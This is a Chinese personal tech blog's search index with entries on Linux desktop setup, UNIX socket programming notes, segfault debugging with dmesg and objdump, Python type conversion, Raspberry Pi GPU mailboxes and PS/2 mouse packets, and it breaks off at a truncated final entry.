<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[linux环境折腾]]></title>
    <url>%2F2017%2Flinux-env%2F</url>
    <content type="text"><![CDATA[本文章主要记录linux如何变为工作环境，区别于Linux命令手册文章 发行版工作环境暂时选择deepin，原因如下: 工作环境离不开qq，ubuntu qq巨卡。基本只有deepin了。 开发比较活跃，有bug随时提交 觉得不过瘾可以自己修改bug 有需求随时提交 觉得不过瘾可以自己修改代码然后pull request 开发者中国人，交流方便 缺点: 稳定性有待考察 心得: 深度终端不错，颜值高，实用。 终端雷神模式不错。alt + F2打开隐藏，使用方便。 基本满足工作环境 即时通信 - QQ 跑起来虽然还是很耗资源，但是问题不大 email - ThunderBird/Mutt 正在折腾中 linux开发环境 - 和工作开发环境一样，不用和以前一样跑虚拟机了。 编辑器键盘映射deepin 上替换esc和caps lock因为acps locl基本没什么用还占地方12gsettings set com.deepin.dde.keybinding.mediakey capslock '[]'gsettings set com.deepin.dde.keyboard layout-options '["caps:swapescape"]' VIM主题暂时使用oh-my-zsh适不适合开发有待考察。 终端深度的终端做的不错，颜值很高。强烈推荐alt + f2雷神模式 不喜欢bash，装个zsh吧。 zsh主题可以选择random 然后看到自己喜欢的在设置 agnoster sonicradish zsh插件 autojump 自动跳转目录的工具，配合zsh使用 zsh-autosuggestions 自动命令补全 asciinema 录制文本终端 mail在win下面，习惯用foxmail。Linux下面用下面这两个把 ThunderBird 图像界面 安装MinimizeToTray revived (MinTrayR)插件，安装完后需要设置一下就可以让Thunderbird支持后台运行。 Mutt 终端 比较友好的文档 - 来自arch wiki 安装: 用 aptitude 安装即可 配置: 新建配置文件: ~/.muttrc或者~/.mutt/muttrc，安装完后没有这两个文件，我自己新建了一个。如下配置可以正常收取邮件。 12345678910111213141516set imap_user = 791628659set imap_pass = ****************set folder = imaps://imap.qq.com/set spoolfile = +INBOX#mailboxes = +INBOX#set imap_check_subscribed##set header_cache = ~/.cache/mutt#set message_cachedir = "~/.cache/mutt"#unset imap_passive#set imap_keepalive = 300# How often to check for new mail (time in seconds).#set mail_check = 120set my_name = "Breaker" 网络配置 linux网络配置deepin deepin自启动 微信123https://github.com/geeeeeeeeek/electronic-wechatnpm config set registry https://registry.npm.taobao.orgnpm config get registry 添加一个软连接到/usr/bin即可在/usr/share/applications中添加wechat.desktop 2017-05-09 09:45:08最新的deepin上已经集成了lectronic-wechat 其他小工具 workrave 定时休息，deepin上运行良好]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[UNIX网络编程]]></title>
    <url>%2F2017%2FUNIX-Network-program%2F</url>
    <content type="text"><![CDATA[unix网络编程知识总结 socket编程简介套接字地址结构POSIX通用数据类型 数据类型 说明 头文件 int8_t 带符号的8位整数 &lt;sys/types.&gt; uint8_t 无符号的8位整数 &lt;sys/types.h&gt; int16_t 带符号的16位整数 &lt;sys/types.h&gt; uint16_t 无符号的16位整数 &lt;sys/types.h&gt; int32_t 带符号的32位整数 &lt;sys/types.h&gt; uint32_t 无符号的32位整数 &lt;sys/types.h&gt; sa_family_t 套接字地址结构的地址组 &lt;sys/socket.h&gt; socklen_t 套接字地址长度的结构，一般为uint32_t &lt;sys/socket.h&gt; in_addr_t IPv4地址，一般为uint32_t &lt;netinet/in.h&gt; in_port_t 端口号，一般为uint16_t &lt;netinet/in.h&gt; IPv4网际套接字地址结构重点12345678910111213struct in_addr&#123; in_addr_t saddr; /* 32-bit IPV4 addr */&#125;struct sockaddr_in&#123; uint8_t sin_len; /* struct len(16) */ sa_family_t sin_family; /* AF_INET */ in_port_t sin_port; /* 16-bit port num */ struct in_addr sin_addr; /* 32bit-IPV4 addr */ char sin_zero[8]; /* unused */&#125; 常用操作12345678#include &lt;netinet/in.h&gt;#include &lt;string.h&gt;struct sockaddr_in addr;bzero(&amp;addr, sizeof(addr));addr.sin_family = AF_INET;addr.sin_addr.s_addr = htonl("0.0.0.0");addr.sin_port = htons(1); sin_len 并不是所有的结构体都支持这个字段。即使有该字段，我们也无需设置他。 POSIX规范只需要结构中的三个字段:sin_family、sin_addr和sin_port三个字段。起他额外字段都是可以接受的。 几乎所有实现都增加了sin_zero字段 in_port_t和in_addr_t都是以网络字序存储的(大端存储)。 32bit IPv4地址有两种访问方式，既struct in_addr 类型或in_addr_t类型。 sin_addr并不是一个uint32类型的整数而是一个in_addr类型的结构体是有一定历史原因的。在早期的时候，struct in_addr被定义为多种结构的联合体。允许访问32bit中的任意4个字节，或者任意两个16bit的值。这些结构在地址被划分为A类B类C类的时候便于方便的获取适当的字节。而随着子网划分和无类子网的编排，各种地址类正在消失、那个联合体已经不在需要了。 套接字结构总是用在给定的主机中，虽然有些字段用来进行主机间通讯。 通用套接字123456struct sockaddr&#123; uint8_t sa_len; sa_family_t sa_family; char sa_data[14];&#125; 所有的套接字函数的套接字地址参数的类型是固定的，想要传入不同类型的套接字结构体指针，按照现在的思路可以强制转换成void *类型。但是这种格式是ASC C规定的，在82年的时候还不能使用这样的方式。所以引入了一个通用套接字结构。通用套接字结构完全是为了满足套接字函数可以传入不同类型的套接字结构体指针而设计的。 所有的linux提供的套接字函数调用的时候都必须强制转换成通用套接字。 IPv612 新的通用套接字不像struct sockaddr，新的struct sockaddr_storage足以容纳系统锁支持的任何套接字地址结构。struct sockaddr_storage结构定义在&lt;netinet/in.h&gt;中12345678struct sockaddr_stroage&#123; uint8_t len; sa_family_t sin_family; /* */&#125; 主机字序和网络字序12345#include &lt;netinet/in.h&gt;uint32_t htonl(uint32_t hostlong); //32bit 主机地址转网络地址uint16_t htons(uint16_t hostshort); //16bit 主机地址转网络地址uint32_t ntohl(uint32_t hostlong); //32bit 网络地址转主机地址uint16_t ntohs(uint16_t hostshort); //16bit 网络地址转主机地址 字节操作函数1234#include &lt;string.h&gt;void bzero(void * dest, size_t bbytes);void bcopy(const void * src, void * dest, size_t nbytes);int bcmp(const void * str1, const void * str2, size_t nbytes); 地址转换函数123#include &lt;arpa/inte.h&gt;int inet_aton(const char * str, struct in_addr *addrptr);char inet_ntoa(struct in_addr inaddr); 新的地址转换函数12 ##基本TCP套接字编程12345678910int socket(int family, int type, int protocol);int bind(int fd, const struct sockaddr * addr, size_t len);int listen(int fd, int backlog);int accept(int fd, struct sockaddr * clientaddr, size_t * clientlen);int connect(int fd, const struct sockaddr * serveraddr, size_t serverlen);int fork(void);int exec();int close(int fd);int getsockname(int fd, struct sockaddr * addr, size_t * len);int getpeername(int fd, strcut sockaddr * addr, size_t * len); socks函数123456789#include &lt;sys/socket.h&gt;/* * 创建套接字，返回文件描述符* family - 协议族，常用 AF_UNIX、AF_LOCAL、AF_INET4、AF_INET6 * type - socket类型，常用SCOK_STREAM、SOCK_DGRAM、SOCK_RAW* protoal - 通常为0* 返回值 返回-1失败，否则返回值为文件描述符。*/int socket(int family, int type, int protocol); bind函数123456789#include &lt;sys/socket.h&gt;/** 绑定套接字地址* fd 文件描述符 * server_addr 填充好的sockaddr结构体。一般需要强制转换类型* len 结构体大小* 成功返回 0 */int bind(int fd, struct sockaddr * server_addr, size_t len); 一般用法12345678910111213#include &lt;sys/socket.h&gt;int result = bind(fd, (struct sockaddr *) &amp; server_addr, sizeof(server_addr));if(0 == result)&#123; printf("绑定[%s]:%d成功\n", inet_ntoa(server_addr.sin_addr.s_addr)); &#125;else&#123; printf("绑定[%s]:%d失败\n");&#125; listen函数12#include &lt;sys/socket.h&gt;int listen(int fd, int backlog); listen函数监听套接字，传入套接字类型必须是SOCK_STREAM or SOCK_SEQPACKET.backlog 最大队列数，当连接数超过这个值的时候，不接受新的连接成功返回0，-1失败。 fork12345678if ((pid = fork()) == 0)&#123; printf("hello from the child");&#125;else&#123; printf("hello from the parent")；&#125; 发现数P92页的错误92页很多函数调用的时候，函数名大小写错误。 TCP/IP详解·卷1:协议(原书第2版) 平装 值-结果类型参数使用getsockname函数获取套接字地址的时候，总是返回0.0.0.0.查了半天资料，才发现getsockname的最后一个参数len是”值-结果”类型参数。也就是说，在调用函数前，len是addr的长度，函数返回由，len也是addr的长度，但是两个长度的含义不一样。一个是参数，一个是结果。 值-结果类型函数都有:123int accept(int fd, struct sockaddr * clientaddr, size_t * clientlen);int getsockname(int fd, struct sockaddr * addr, size_t * len);int getpeername(int fd, strcut sockaddr * addr, size_t * len); 被坑了一把 -.-! waitpidwaitpid()会暂时停止目前进程的执行，直到有信号来到或子进程结束。123#include&lt;sys/types.h&gt;#include&lt;sys/wait.h&gt;pid_t waitpid(pid_t pid, int * status, int options); 如果在调用 waitpid()时子进程已经结束,则 waitpid()会立即返回子进程结束状态值 子进程的结束状态值会由参数 status 返回,而子进程的进程识别码也会一起返回 如果不在意结束状态值,则参数 status 可以设成 NULL。参数 pid 为欲等待的子进程识别码, 参数pid pid &lt; -1 等待进程组识别码为 pid 绝对值的任何子进程 pid = -1 等待任何子进程,相当于 wait()。 pid = 0 等待进程组识别码与目前进程相同的任何子进程。 pid &gt; 0 等待任何子进程识别码为 pid 的子进程 参数option 参数options提供了一些额外的选项来控制waitpid，参数 option 可以为 0 或可以用”|”运算符把它们连接起来使用，比如：WNOHANG | WUNTRACED。若不需要设置为零 WNOHANG 若pid指定的子进程没有结束，则waitpid()函数返回0，不予以等待。若结束，则返回该子进程的ID。 WUNTRACED 若子进程进入暂停状态，则马上返回，但子进程的结束状态不予以理会。WIFSTOPPED(status)宏确定返回值是否对应与一个暂停子进程。 参数status子进程的结束状态返回后存于status,底下有几个宏可判别结束情况: WIFEXITED(status)如果若为正常结束子进程返回的状态，则为真；对于这种情况可执行WEXITSTATUS(status)，取子进程传给exit或_eixt的低8位。 WEXITSTATUS(status)取得子进程exit()返回的结束代码,一般会先用WIFEXITED 来判断是否正常结束才能使用此宏。 WIFSIGNALED(status)若为异常结束子进程返回的状态，则为真；对于这种情况可执行WTERMSIG(status)，取使子进程结束的信号编号。 WTERMSIG(status)取得子进程因信号而中止的信号代码,一般会先用 WIFSIGNALED 来判断后才使用此宏。 WIFSTOPPED(status)若为当前暂停子进程返回的状态，则为真；对于这种情况可执行WSTOPSIG(status)，取使子进程暂停的信号编号。 WSTOPSIG(status)取得引发子进程暂停的信号代码,一般会先用WIFSTOPPED来判断后才使用此宏。 如果执行成功则返回子进程识别码(PID) ,如果有错误发生则返回返回值-1。失败原因存于 errno 中。 TCP server client编程项目之前做工作中接触过nginx服务器。对nginx的架构有一定了解，打算做一个类似的服务器。具体还没想好 预备知识: 网络编程相关 服务器架构 linux I\O相关编程 计算机网络 操作系统原理 可能用到的技术: DPDK mTCP 协程 内存管理 libevent JIT 这些都是我在工作中接触到的并且处在知其然而不知其所以然的状态，其中有些技术是冲突的，不能同时使用。希望在这个服务器中尽量的使用这些技术，完全是为了熟悉这些技术。最后可能做成四不像，然而这并不是很重要。]]></content>
      <tags>
        <tag>unix</tag>
        <tag>program</tag>
        <tag>network</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[新年快乐]]></title>
    <url>%2F2016%2Fhappy-new-year%2F</url>
    <content type="text"><![CDATA[新年快乐还剩几个小时，2017年就要到来了。16年的工作和学习状态不是很满意。新的一年要再接再厉。 原文地址 原文作者： Breaker 这是？这是我为了从一个网络安全开发者蜕变为资深网络安全(精通计算机网络、linux网络编程、linux内核)开发者的计划，其计划历时数月。 我的目标是找到一种相对比较高效的学习方法。在平时的工作和学习中，每天都要面对大量的需要学习知识和技能。如果纯粹只是为了当时解决工作中遇到的某个问题，而不重视知识的积累，这样造成的结果就是今天查到的东西在未来某一天需要用到的时候还要在查一遍。纯粹是浪费时间。 目录[TOC] 为何用到它为了我以后的工作和目标而遵守这份计划。2015年7月以来，我一直从事入侵防御系统系统引擎的开发工作。通过一年多的工作，已经大致掌握了网络安全工作原理。在工作中明显感觉到知识匮乏，这是工作效率不能令我满意的原因。仔细思考了下，在新的一年里需要学习的内容有三方面：计算机网络、 linux网络编程以及linux内核。所以需要一次系统的知识升级。 如何使用它下面的东西都只是一个概述。因此，你需要自上而下的逐一的处理它。在学习过程中，用TO DO LIST标记和检查学习进度。 Follow me我是一个对网络安全很高兴趣的软件工程师，目前就职与NSFOCUS。为了达到我的目标，每天完成艰辛的工作后，平均学习三小时。我已经在梦想实现的途中了。Github: @BreakerCoding: @Breaker 别认为自己不够聪明虽然已经下定决心，但是辛苦的工作了一天之后我担心自己是否由能承受高负荷的学习。 加强运动，劳逸结合。 看到砖头厚的书感到力不从心. 想想掌握这么多知识后的喜悦。 关于视频资源网络上有很多视频资源可以学习，推荐看书疲倦了可以看看视频。 在你开始之前该列表已经持续更新了很长的一段时间，所以，我们的确很容易会对其失去控制。这里列出了一些我所犯过的错误，希望您不要重滔覆辙。 0. 保持兴趣最重要的写在最前面，保持兴趣是最大的动力。所以不要枯燥的看书，可以列出一些很有意思的项目来实现。比如说学习linux编程可以写一个服务器出来。就想我之前学习操作系统写了一个小型操作系统OS One 一样。 1. 你不可能把所有的东西都记住就算我查看了数小时的视频，并记录了大量的笔记。几个月后的我，仍然会忘却其中大部分的东西。所以，我翻阅了我的笔记，并将可回顾的东西记成笔记，印象笔记、博客或者github仓库。 2. 记笔记我习惯使用makedown记笔记，这在开发者中已经非常普遍了。将写完的笔记保存到印象笔记、个人博客或者github仓库中。印象笔记不支持markdown，可以用马克飞象编辑，编辑完后上传到印象笔记，很方便。最主要的是马克飞象的界面很友好，我已经买了一年的马克飞象。相对与博客来说，印象笔记比较私密。普通的github账户和博客差不多，都是完全开放的。但是我的github账户是高级账户，可以创建私有仓库。可以很好的利用这一点。 3.重复、重复再重复在手机上很方便的看之前的笔记和文章，可以很好的利用空余时间复习。每编程半个小时就要休息一下，并很轻松的去回顾你的笔记。 4. 专注在学习的过程中，往往会有许多令人分心的事占据着我们宝贵的时间。因此，专注和集中注意力是非常困难的。 5. 技巧 第一遍学习不要陷入细节，抓住主要知识点，记录笔记 第二遍回看的时候详细思考，不能只记住结果，要思考原因 利用空余时间重复进行第三遍第四遍第五遍学习 日常计划部分问题可能会花费一天的时间去学习，而部分则会花费多天。当然，有些学习并不需要我们懂得如何实现。因此，每一天我都会在下面所列出的列表中选择一项，并查看相关的视频。然后，使用以下的一种语言去实现： C —— 使用结构体和函数，该函数会接受一个结构体指针 * 及其他数据作为参数。C++ —— 不使用内建的数据类型。C++ —— 使用内建的数据类型，如使用 STL 的 std::list 来作为链表。Python —— 使用内建的数据类型（为了持续练习 Python），并编写一些测试去保证自己代码的正确性。有时，只需要使用断言函数 assert() 即可。此外，你也可以使用 Java 或其他语言。以上只是我的个人偏好而已。 为何要在这些语言上分别实现一次？ 因为可以练习，练习，练习，直至我厌倦它，并完美地实现出来。（若有部分边缘条件没想到时，我会用书写的形式记录下来并去记忆）因为可以在纯原生的条件下工作（不需垃圾回收机制的帮助下，分配/释放内存（除了 Python））因为可以利用上内建的数据类型，以使得我拥有在现实中使用内建工具的经验（在生产环境中，我不会去实现自己的链表） 就算我没有时间去每一项都这么做，但我也会尽我所能的。 在这里，你可以查看到我的代码: C C++ python 你不需要记住每一个算法的内部原理。在一个白板上写代码，而不要直接在计算机上编写。在测试完部分简单的输入后，到计算机上再测试一遍。 必备知识计划总共分为三大部分，这些内容直接可以同时进行，不需要掌握前面的知识后再学习后面的。这样才能学的更快。 第一部分 计算机网络第二部分 linux内核第三部分 linux网络编程 [ ] 项目: 写一个稳定的服务器。 书籍三大块知识都有相应的权威著作，前两本的作者是一个人w.richard stevens，linux内核的书暂时没有定 TCP/IP详解·卷1:协议(原书第2版) 平装 UNIX网络编程(卷1):套接字联网API(第3版) 魅力·实践·发现:Linux内核精析还没有定，暂时借的国图的书，感觉不是很合适，确定那一本书后买一本 其他有意思的知识纯粹是为了玩，没啥目的。都是大家晚盛夏的。 机器学习可以试着做出12306验证码识别 大数据爬一些数据，然后自己分析。]]></content>
      <tags>
        <tag>新年</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[推荐chrome插件vimium]]></title>
    <url>%2F2016%2Fvimium%2F</url>
    <content type="text"><![CDATA[对于用惯了vim的人来说，能用vim的快捷键来浏览网页控制浏览器是一件很爽的事情。今天发现了了一个chrome的插件vimium让你彻底脱离鼠标，用键盘控制你的浏览器。试了下，要做一些其它复杂的操作（比如说注册帐号什么的）还是不得不用到鼠标，像阅读文章，文档，刷知乎，coding神马的纯键盘操作还是很舒服的。 vimium的快捷键已经贴在上面了，操作和vim很类似，shift + /显示帮助页面。项目地址]]></content>
      <categories>
        <category>Other</category>
      </categories>
      <tags>
        <tag>vim</tag>
        <tag>vimium</tag>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 段错误调试]]></title>
    <url>%2F2015%2Fsegmentfault-debugging%2F</url>
    <content type="text"><![CDATA[今天修改了一个段错误的bug。 第一步 用dmesg命令查看最近的段错误。[Mon Sep 14 15:11:50 2015] class[4200]: segfault at 0 ip 00007fcac993dbdd sp 00007fcaca4f5ac8 error 4 in libzealot.so[7fcac98ea000+6c000] segfault at 0 表示段错误发生的地址。这里是0，可以判断是给地址为0处读取或者写入一个值。也就是出现了空指针的问题 ip 00007fcac993dbdd 这是错误发生的时候ip的位置，根据这个值可以定位错误发生的位置。 sp 00007fcaca4f5ac8 这是错误发生的时候sp的位置。调试过程中没有用到。 error 4 错误类型，在这里等于4 也就是bit2 == 1 user-mode access，bit1 == 0 read access，bit0 == 0 no page found。 结合ip的值可以判断是因为访问了一个空指针（read）。 /* * Page fault error code bits: * * bit 0 == 0: no page found 1: protection fault * bit 1 == 0: read access 1: write access * bit 2 == 0: kernel-mode access 1: user-mode access * bit 3 == 1: use of reserved bit detected * bit 4 == 1: fault was an instruction fetch */ libzealot.so[7fcac98ea000+6c000] 错误发生的动态库。7fcac98ea000表示这次动态库加载的内存基地址，6c000是大小。 第二部 反汇编objdump -d zealot.so &gt; zealot.dump 第三部 定位0x00007fcac993dbdd - 0x7fcac98ea000 = 0x53bdd。在zealot.dump中找53bdd 定位到代码 可以看到此处代码是 mov (%rax),%rax 。此处rax为零导致段错。再去分析C代码，就可以找到问题。 &nbsp; 注意 如果段错发生在动态库中，由于每次动态库加载的地址都不一样。 若 ip - 动态库基地址值不变，说明出问题的位置是同一处。 &nbsp; 参考 http://stackoverflow.com/questions/2549214/interpreting-segfault-messages http://blog.163.com/longsu2010@yeah/blog/static/17361234820122761525799/ &nbsp; &nbsp;]]></content>
      <categories>
        <category>Coding</category>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[列表，元组，字符串互相转换]]></title>
    <url>%2F2015%2Flist-tuple-strings%2F</url>
    <content type="text"><![CDATA[列表，元组，字符串之间的转化通过join(), str(), list(), tuple() 这四个函数实现。 用list可以把字符串和元组转化为列表 &gt;&gt;&gt; demo_str = 'test' &gt;&gt;&gt; demo_tuple = ('t','e','s','t') &gt;&gt;&gt;demo_list = ['t','e','s','t'] &gt;&gt;&gt; temp = list(demo_tuple) &gt;&gt;&gt; type(temp) &lt;type 'list'&gt; &gt;&gt;&gt; temp = list(demo_str) &gt;&gt;&gt; type(temp) &lt;type 'list'&gt; 用tuple() 可以将字符串和列表转化为元组 &gt;&gt;&gt; demo_str = 'test' &gt;&gt;&gt; demo_tuple = ('t','e','s','t') &gt;&gt;&gt;demo_list = ['t','e','s','t'] &gt;&gt;&gt; temp = tuple(demo_str) &gt;&gt;&gt; type(temp) &lt;type 'tuple'&gt; &gt;&gt;&gt; temp = tuple(demo_list) &gt;&gt;&gt; type(temp) &lt;type 'tuple'&gt; 用str() 可以将字符串和列表转化为字符串&gt;&gt;&gt; demo_str = 'test' &gt;&gt;&gt; demo_tuple = ('t','e','s','t') &gt;&gt;&gt;demo_list = ['t','e','s','t'] &gt;&gt;&gt; temp = str(demo_list) &gt;&gt;&gt; type(temp) &lt;type 'str'&gt; &gt;&gt;&gt; temp = str(demo_tuple) &gt;&gt;&gt; type(temp) &lt;type 'str'&gt; 注意用str()转换的字符串不能用print()函数以字符串形式显示 &gt;&gt;&gt; demo_str = ‘test’&gt;&gt;&gt; demo_tuple = (‘t’,’e’,’s’,’t’)&gt;&gt;&gt;demo_list = [‘t’,’e’,’s’,’t’]&gt;&gt;&gt; temp = str(demo_list)&gt;&gt;&gt; type(temp)&lt;type ‘str’&gt;&gt;&gt;&gt;print (temp)[‘t’, ‘e’, ‘s’, ‘t’]&gt;&gt;&gt; temp = str(demo_tuple)&gt;&gt;&gt; type(temp)&lt;type ‘str’&gt;&gt;&gt;&gt;print (temp)(‘t’, ‘e’, ‘s’, ‘t’)对于这种问题要用join()函数处理 &gt;&gt;&gt; demo_str = ‘test’&gt;&gt;&gt; demo_tuple = (‘t’,’e’,’s’,’t’)&gt;&gt;&gt;demo_list = [‘t’,’e’,’s’,’t’]&gt;&gt;&gt; temp = ‘’.join(demo_list)&gt;&gt;&gt; type(temp)&lt;type ‘str’&gt;&gt;&gt;&gt;print (temp)test&gt;&gt;&gt; temp = ‘’.join(demo_tuple)&gt;&gt;&gt; type(temp)&lt;type ‘str’&gt;&gt;&gt;&gt;print (temp)test用join()和str()生成的都是字符串类型的，但为什么用print 输出的结果不同？ &nbsp; 本文地址: http://blog.0x7c00.cn/?p=179 By Breaker 同时被收录在: Breaker’s Wiki QQ: 791628659]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>print</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Raspberry Pi GPU 编程]]></title>
    <url>%2F2014%2Fraspberry-pi-gpu-e7-bc-96-e7-a8-8b%2F</url>
    <content type="text"><![CDATA[要把我的操作系统移植到Raspberry Pi 上了，所以最近一直在看ARM的东西。找来找去只找到一个有点用的 http://www.cl.cam.ac.uk/projects/raspberrypi/tutorials/os/ 剑桥大学的一份教程，虽然离一个完整的内核还差得很远，但对我还算是有点用。之前一直担心的GPU的问题也解决了，也是我找到的唯一一份和Raspberry Pi GPU编程相关的东西了。 这次用到的是 2bit的 High Color — Use 16 bits to store each pixel, the first 5 bit representing the intensity of the red channel, the next 6 bits representing the intensity of the green channel and the final 5 bits representing the intensity of the blue channel &lt;!– [if IE 6]&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../../../../style/ie6.css&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.cam.ac.uk/global/js/minmax.js&quot;&gt;&lt;/script&gt;&lt;![endif]--&gt;&lt;!-- [if IE 7]&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../../../../style/ie7.css&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;&lt;![endif]--&gt;&lt;script src=&quot;//www.google-analytics.com/analytics.js&quot; async=&quot;&quot;&gt;&lt;/script&gt;&lt;script src=&quot;script.js&quot; type=&quot;text/javascript&quot; language=&quot;javascript&quot;&gt;&lt;/script&gt;&lt;script&gt;// &lt;![CDATA[ (function(i,s,o,g,r,a,m){i[‘GoogleAnalyticsObject’]=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,’script’,’//www.google-analytics.com/analytics.js’,’ga’); ga(‘create’, ‘UA-47341509-1’, ‘cam.ac.uk’); ga(‘send’, ‘pageview’);// ]]&gt; 这么奇怪的启动方式。加电后GPU先启动，然后 ARM核才启动，两个处理器通过“邮件”的方式通信，详见 The Raspberry Pi has a very special and rather odd relationship with it’s graphics processor. On the Raspberry Pi, the graphics processor actually runs first, and is responsible for starting up the main processor. This is very unusual. Ultimately it doesn’t make too much difference, but in many interactions, it often feels like the processor is secondary, and the graphics processor is the most important. The two communicate on the Raspberry Pi by what is called the ‘mailbox’. Each can deposit mail for the other, which will be collected at some future point and then dealt with. We shall use the mailbox to ask the graphics processor for an address. The address will be a location to which we can write the pixel colour information for the screen, called a frame buffer, and the graphics card will regularly check this location, and update the pixels on the screen appropriately. &lt;!– [if IE 6]&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../../../../style/ie6.css&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.cam.ac.uk/global/js/minmax.js&quot;&gt;&lt;/script&gt;&lt;![endif]--&gt;&lt;!-- [if IE 7]&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../../../../style/ie7.css&quot; type=&quot;text/css&quot; media=&quot;screen&quot; /&gt;&lt;![endif]--&gt;&lt;script src=&quot;//www.google-analytics.com/analytics.js&quot; async=&quot;&quot; type=&quot;mce-no/type&quot;&gt;&lt;/script&gt;&lt;script src=&quot;script.js&quot; type=&quot;mce-text/javascript&quot; language=&quot;javascript&quot;&gt;&lt;/script&gt;&lt;script type=&quot;mce-no/type&quot;&gt;// &lt;![CDATA[ (function(i,s,o,g,r,a,m){i[‘GoogleAnalyticsObject’]=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,’script’,’//www.google-analytics.com/analytics.js’,’ga’); ga(‘create’, ‘UA-47341509-1’, ‘cam.ac.uk’); ga(‘send’, ‘pageview’);// ]]&gt; Table - Mailbox Addresses Address Size / Bytes Name Description Read / Write 2000B880 4 Read Receiving mail. R 2000B890 4 Poll Receive without retrieving. R 2000B894 4 Sender Sender information. R 2000B898 4 Status Information. R 2000B89C 4 Configuration Settings. RW 2000B8A0 4 Write Sending mail. W&nbsp; 发送： The sender waits until the Status field has a 0 in the top bit. The sender writes to Write such that the lowest 4 bits are the mailbox to write to, and the upper 28 bits are the message to write.接收: The receiver waits until the Status field has a 0 in the 30th bit. The receiver reads from Read. The receiver confirms the message is for the correct mailbox, and tries again if not.&lt;!– [if IE 6]&gt; &lt;![endif]–&gt;// &lt;![CDATA[(function(i,s,o,g,r,a,m){i[‘GoogleAnalyticsObject’]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,’script’,’//www.google-analytics.com/analytics.js’,’ga’);ga(‘create’, ‘UA-47341509-1’, ‘cam.ac.uk’);ga(‘send’, ‘pageview’);// ]]&gt;]]></content>
      <categories>
        <category>Operating System</category>
      </categories>
      <tags>
        <tag>GPU</tag>
        <tag>mailbox</tag>
        <tag>图像</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PS2鼠标中断信号的处理]]></title>
    <url>%2F2014%2Fps2-mouse%2F</url>
    <content type="text"><![CDATA[键盘数据已经可以正常接收了，鼠标的处理比键盘要稍微复杂一点。鼠标每次的信号是三个字节，第一字节0-2分别保存着鼠标左键右键中键是否按下的标志。3位一直为1。根据这个特性可以判断接收到的字节是否是鼠标第一字节的信号。4 5 两位分别表示鼠标 x，y位置是否发生位移。 6 7 是 x y溢出标志位。 判断是第一个字节后依次接收第二，三个字节。然后将三个字节一起处理。第二字节和第三字节保存着x 位移 和y 位移的补码。也就是说x y 都是带符号的，正号表示正方向，负号表示负方向。X ，Y 的正方向分别为 左 和 下。 这里Y的正方向和我们平时的习惯正好相反。所以计算出来后要加负号。 还有要注意的就是在鼠标初始化完成的时候会产生一个鼠标中断，0x7A 。要将这一个字节的数据过滤掉，不能算在鼠标信号中。找了一份PS2的协议，下面是鼠标三个字节数据的定义。表格果然直观多了。 可以处理鼠标信号后要做的第一件事就是让鼠标动起来。 代码很简单，当前坐标加上位移，计算出新坐标重回鼠标就可以。桌面的重绘还没有做。所以会出现 win 移动窗口的特效，真是炫酷 ;-) 。 Movement Data Packet: 位移数据包 The standard PS/2 mouse sends movement (and button) information to the host using the following 3-byte packet (4): 标准的 PS/2 鼠标发送位移和按键信息给主机采用如下的 3 字节数据包格式见本章脚注 4 &nbsp; Bit 7 Bit 6 Bit 5 Bit 4 Bit 3 Bit 2 Bit 1 Bit 0 Y overflow X overflow Y sign bit X sign bit Always 1 Middle Btn Right Btn Left Btn X Movement Y Movement Byte 1 Byte 2 Byte 3 &nbsp; The movement counters are 9-bit 2’s complement integers, where the most significant bit appears as a sign bit in Byte 1 of the movement data packet. These counters are updated when the mouse reads its input and finds movement has occurred. Their value is the amount of movement that has occurred since the last movement data packet was sent to the host (ie, after a packet is sent to the host, the movement counters are reset.) The range of values that can be expressed by the movement counters is -255 to +255. If this range is exceeded, the appropriate overflow bit is set and the counter is not incremented/decremented until it is reset. 位移计数器是一个 9 位 2 的补码整数 它的 高位作为符号位出现在位移数据包的第一个字节里 这些计数器在鼠标读取输入发现有位移时被更新 这些值是自从 后一次发送位移数据包给主机后位移的累计量即 后一次包发给主机后 位移计数器被复位 位移计数器可表示的值的范围是-255 到+255 如果超过了范围 相应的溢出位就被设置 并且在复位前 计数器不会增减 &nbsp; As I mentioned earlier, the movement counters are reset whenever a movement data packet is successfully sent to the host. They are also reset after the mouse receives any command from the host other than the “Resend” (0xFE) command. 正如我前面提及的 一旦位移数据包成功地发送给主机 位移计数器就会复位 同样鼠标在收到主机不是Resend 0xFE 命令外的其他命令 计数器也会复位]]></content>
      <categories>
        <category>Operating System</category>
      </categories>
      <tags>
        <tag>PS2</tag>
        <tag>协议</tag>
        <tag>鼠标</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[80386寄存器（转载）]]></title>
    <url>%2F2014%2F80386-register%2F</url>
